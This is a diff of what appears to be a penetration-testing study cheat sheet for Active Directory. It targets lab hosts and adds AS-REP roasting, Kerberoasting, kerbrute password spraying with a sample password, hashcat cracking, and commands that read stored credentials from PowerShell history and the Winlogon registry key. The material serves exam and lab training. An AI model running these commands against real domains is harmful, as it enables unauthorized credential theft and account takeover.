@@ -57,25 +57,34 @@ ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"
 
 # kerbrute
 ## anon
-kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local
+kerbrute.py -users ./users.txt -dc-ip 192.168.10.175 -domain oscp.exam
 
 
-# GetNPUsers.py
+# GetNPUsers.py(18200)
 ## anon
+### without providing anything.
+impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/
 GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
 GetNPUsers.py active.htb/ -dc-ip 10.10.10.100
 
-## with username
-GetNPUsers.py Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass
 
-## with username list
+### with usernames.txt
+impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+
+### with username whos "Do not require Kerberos preauthentication" is enabled (## This will get us dave's TGT if his pre-authentication)
+impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/dave -no-pass
+impacket-GetNPUsers Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass
+impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %> -request -no-pass -dc-ip <% tp.frontmatter["RHOST"] %>
+
+### with valid credentials(pete/Nexus123!) this will return a user's TGT ticket whos "Do not require Kerberos preauthentication" is enabled.
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete (#this requires pete's password for us to be able to get dave's TGT)
+
+### with username list
+impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/ -usersfile usernames.txt
 GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
-GetUserSPNs.py -request -dc-ip 10.129.193.5 active.htb/svc_tgs
 
 ## hashcat
 hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
-
-
 
 
 # bloodhound
@@ -151,6 +160,11 @@ cmdkey /list
 cat (Get-PSReadlineOption).HistorySavePath
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 
+# Password spray with kerbrute
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+
+# AP-REP roast
+.\Rubeus.exe asreproast /nowrap
 
 # kerberoast
 .\Rubeus.exe kerberoast
